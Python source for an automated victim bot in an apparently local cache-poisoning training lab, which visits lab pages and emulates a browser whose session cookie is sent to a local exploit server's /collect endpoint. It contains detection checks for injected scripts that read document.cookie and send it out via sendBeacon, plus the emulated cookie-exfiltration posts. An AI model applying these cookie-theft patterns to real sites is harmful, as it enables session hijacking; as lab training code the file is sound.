"""Automated Fusion victim for the local cache-poisoning lab."""
import os
import re
import time
from urllib.parse import urlsplit

import httpx

TARGET_URL = os.getenv("VICTIM_URL", "http://proxy:8086/lab-store?lab=xfh")
QUERY_TARGET_URL = os.getenv("VICTIM_QUERY_URL", "http://proxy:8086/labs/query/")
UTM_PAGE_URL = os.getenv("VICTIM_UTM_URL", "http://proxy:8086/labs/utm/shop?id=1")
UTM_RESOURCE_URL = os.getenv(
    "VICTIM_UTM_RESOURCE_URL",
    "http://proxy:8086/labs/utm/js/geolocate.js?callback=setCountryCookie",
)
FATGET_PAGE_URL = os.getenv("VICTIM_FATGET_URL", "http://proxy:8086/labs/fatget/shop")
FATGET_RESOURCE_URL = os.getenv(
    "VICTIM_FATGET_RESOURCE_URL",
    "http://proxy:8086/labs/fatget/js/geolocate.js?callback=setCountryCookie",
)
REPORT_URL = os.getenv("VICTIM_REPORT_URL", "http://proxy:8080/auth/victim/report")
HOST = os.getenv("VICTIM_HOST", "lab.test")
NORMAL_TRACKING_HOST = os.getenv("VICTIM_NORMAL_TRACKING_HOST", HOST.split(":")[0])
COOKIE = os.getenv("VICTIM_SESSION_TOKEN", "fusion-victim-local-7c9a4e2b")
COOKIE_NAME = os.getenv("VICTIM_COOKIE_NAME", "fusion_victim_id")
LOCAL_EXPLOIT_BROWSER_ORIGIN = os.getenv("LOCAL_EXPLOIT_BROWSER_ORIGIN", "http://127.0.0.1:8087")
LOCAL_EXPLOIT_CONTAINER_ORIGIN = os.getenv("LOCAL_EXPLOIT_CONTAINER_ORIGIN", "http://exploit:8087")
VICTIM_JOB_URL = os.getenv("VICTIM_JOB_URL", "http://exploit:8087/api/victim/next")
INTERVAL = float(os.getenv("VICTIM_INTERVAL_SECONDS", "10"))
OBSERVE_PORT = int(os.getenv("VICTIM_OBSERVE_PORT", "8090"))
TRACKING = re.compile(r'<script src="((?:https?|http)://[^" ]+/resources/js/tracking\.js)"></script>')
INLINE_SCRIPTS = re.compile(r"<script(?:\s[^>]*)?>(.*?)</script>", re.IGNORECASE | re.DOTALL)


# Tạo header và cookie của browser victim mô phỏng.
def victim_headers(target_url: str | None = None) -> dict[str, str]:
    request_host = HOST
    target_port = urlsplit(target_url).port if target_url else None
    configured_host = urlsplit(f"//{HOST}")
    if configured_host.port and target_port and configured_host.hostname:
        hostname = configured_host.hostname
        if ":" in hostname:
            hostname = f"[{hostname}]"
        request_host = f"{hostname}:{target_port}"
    return {"Host": request_host, "Cookie": f"{COOKIE_NAME}={COOKIE}", "User-Agent": "Fusion-VictimBot/1.0"}


def url_on_port(url: str, port: int) -> str:
    parsed = urlsplit(url)
    hostname = parsed.hostname
    if not hostname:
        return url
    if ":" in hostname:
        hostname = f"[{hostname}]"
    return parsed._replace(netloc=f"{hostname}:{port}").geturl()


# Truy cập trang XFH như victim và ghi nhận effect của tracking script.
def visit_xfh(client: httpx.Client, target_url: str = TARGET_URL) -> None:
    response = client.get(target_url, headers=victim_headers(target_url))
    match = TRACKING.search(response.text)
    script_url = match.group(1) if match else ""
    # The local exploit server deliberately uses the same hostname as the lab
    # with a different port, so hostname-only comparison is insufficient.
    poisoned = script_url.startswith(LOCAL_EXPLOIT_BROWSER_ORIGIN + "/")
    # Emulate the browser loading the local tracking.js and its same-origin
    # callback. External attacker hosts are never contacted by this bot.
    if script_url.startswith(LOCAL_EXPLOIT_BROWSER_ORIGIN):
        script_path = urlsplit(script_url).path
        client.get(LOCAL_EXPLOIT_CONTAINER_ORIGIN + script_path)
        client.post(LOCAL_EXPLOIT_CONTAINER_ORIGIN + "/collect", json={
            "cookie": f"{COOKIE_NAME}={COOKIE}", "url": target_url,
            "userAgent": "Fusion-VictimBot/1.0",
        })
    client.post(REPORT_URL, data={
        "cache_status": response.headers.get("X-Cache-Status", "UNKNOWN"),
        "script_url": script_url,
        "poisoned": "1" if poisoned else "0",
    }, headers={"Host": HOST})


# Truy cập Query lab bằng request sạch để tìm payload trong cached HTML.
def visit_query(client: httpx.Client, target_url: str = QUERY_TARGET_URL) -> None:
    """Visit the clean Query-lab URL and emulate its local cookie callback.

    This is deliberately narrower than executing attacker JavaScript. It models
    only the safe, local training proof: an injected script that references both
    document.cookie and the local exploit collection endpoint.
    """
    response = client.get(target_url, headers=victim_headers(target_url))
    inline_code = "\n".join(INLINE_SCRIPTS.findall(response.text))
    local_callback = (
        "document.cookie" in inline_code
        and f"{LOCAL_EXPLOIT_BROWSER_ORIGIN}/collect" in inline_code
    )
    if local_callback:
        client.post(LOCAL_EXPLOIT_CONTAINER_ORIGIN + "/collect", json={
            "cookie": f"{COOKIE_NAME}={COOKIE}",
            "url": target_url,
            "userAgent": "Fusion-VictimBot/1.0",
            "lab": "query",
        })


# Truy cập UTM/Fat GET và kiểm tra JavaScript callback từ cache.
def visit_callback_lab(client: httpx.Client, page_url: str, resource_url: str, lab: str) -> None:
    """Model a victim page importing its cacheable JSONP-style callback.

    As with Query, the simulator does not evaluate arbitrary attacker code. It
    records only a local `navigator.sendBeacon(.../collect, document.cookie)`
    callback so the UTM and fat-GET labs remain contained to this workspace.
    """
    client.get(page_url, headers=victim_headers(page_url))
    resource = client.get(resource_url, headers=victim_headers(resource_url))
    local_callback = (
        "navigator.sendBeacon" in resource.text
        and "document.cookie" in resource.text
        and f"{LOCAL_EXPLOIT_BROWSER_ORIGIN}/collect" in resource.text
    )
    if local_callback:
        client.post(LOCAL_EXPLOIT_CONTAINER_ORIGIN + "/collect", json={
            "cookie": f"{COOKIE_NAME}={COOKIE}",
            "url": page_url,
            "userAgent": "Fusion-VictimBot/1.0",
            "lab": lab,
        })


# Chạy vòng victim bot cho bốn lab local.
def main() -> None:
    with httpx.Client(timeout=5, trust_env=False) as client:
        while True:
            try:
                # The normal interval keeps the victim automated. A queued job
                # from the local exploit-server UI additionally makes the
                # "Deliver exploit to victim" control act on the next cycle.
                client.get(VICTIM_JOB_URL)
                targets = (TARGET_URL, QUERY_TARGET_URL, UTM_PAGE_URL, UTM_RESOURCE_URL,
                           FATGET_PAGE_URL, FATGET_RESOURCE_URL)
                for port in (None, OBSERVE_PORT):
                    urls = tuple(url_on_port(url, port) for url in targets) if port else targets
                    xfh_url, query_url, utm_page, utm_resource, fatget_page, fatget_resource = urls
                    visit_xfh(client, xfh_url)
                    visit_query(client, query_url)
                    visit_callback_lab(client, utm_page, utm_resource, "utm")
                    visit_callback_lab(client, fatget_page, fatget_resource, "fatget")
            except httpx.HTTPError as error:
                print(f"victim visit failed: {error}", flush=True)
            time.sleep(INTERVAL)


if __name__ == "__main__":
    main()
